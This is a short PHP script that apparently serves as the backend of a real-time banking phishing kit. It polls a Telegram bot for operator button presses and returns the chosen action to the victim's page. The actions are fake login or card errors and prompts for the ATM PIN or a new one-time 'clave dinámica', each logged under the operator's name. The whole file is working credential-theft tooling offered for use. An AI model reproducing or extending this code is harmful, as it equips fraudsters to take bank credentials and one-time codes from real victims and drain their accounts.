<?php
session_start();
header('Content-Type: application/json');

$config = require __DIR__ . '/../../config.php';

$transactionId = $_POST['transactionId'] ?? '';
$messageId     = $_POST['messageId'] ?? '';

if (!$transactionId || !$messageId) {
    echo json_encode(['action' => null]);
    exit;
}

$offset = $_SESSION['last_update_id'] ?? 0;

$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset=" . ($offset + 1));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data   = json_decode($response, true);
$action = null;

if (!empty($data['result'])) {

    foreach ($data['result'] as $update) {

        if (isset($update['update_id'])) {
            $_SESSION['last_update_id'] = $update['update_id'];
        }

        if (!isset($update['callback_query']['data'])) continue;

        $cb = $update['callback_query'];
        if (strpos($cb['data'], $transactionId) === false) continue;

        list($actionType) = explode(':', $cb['data']);

        $validas = [
            'error_logo',
            'error_cajero',
            'error_dinamica',
            'error_tarjeta',
            'pedir_dinamica',
            'confirm_finalizar'
        ];

        if (!in_array($actionType, $validas)) continue;

        $action = $actionType;

        $from = $cb['from'];
        $nombre = trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
        $operador = !empty($from['username'])
            ? '@' . $from['username']
            : ($nombre !== '' ? $nombre : 'Operador');

        $msg      = $cb['message'];
        $origText = $msg['text'] ?? '';

        $accionesHumanas = [
            'error_logo'        => 'Error en LOGO',
            'error_cajero'      => 'Pidió clave de cajero',
            'error_dinamica'    => 'Clave dinámica incorrecta',
            'error_tarjeta'     => 'Error en tarjeta',
            'pedir_dinamica'    => 'Pidió nueva dinámica',
            'confirm_finalizar' => 'Finalizó operación'
        ];

        $accionHumana = $accionesHumanas[$actionType];

        $newText = $origText .
            "\n\n————————————\n" .
            "✅ Acción: <b>{$accionHumana}</b>\n" .
            "👤 Operador: <b>{$operador}</b>";

        $payload = [
            'chat_id'    => $msg['chat']['id'],
            'message_id' => $msg['message_id'],
            'text'       => $newText,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $chEdit = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageText");
        curl_setopt($chEdit, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($chEdit, CURLOPT_POST, true);
        curl_setopt($chEdit, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($chEdit, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($chEdit);
        curl_close($chEdit);

        break;
    }
}

echo json_encode(['action' => $action]);
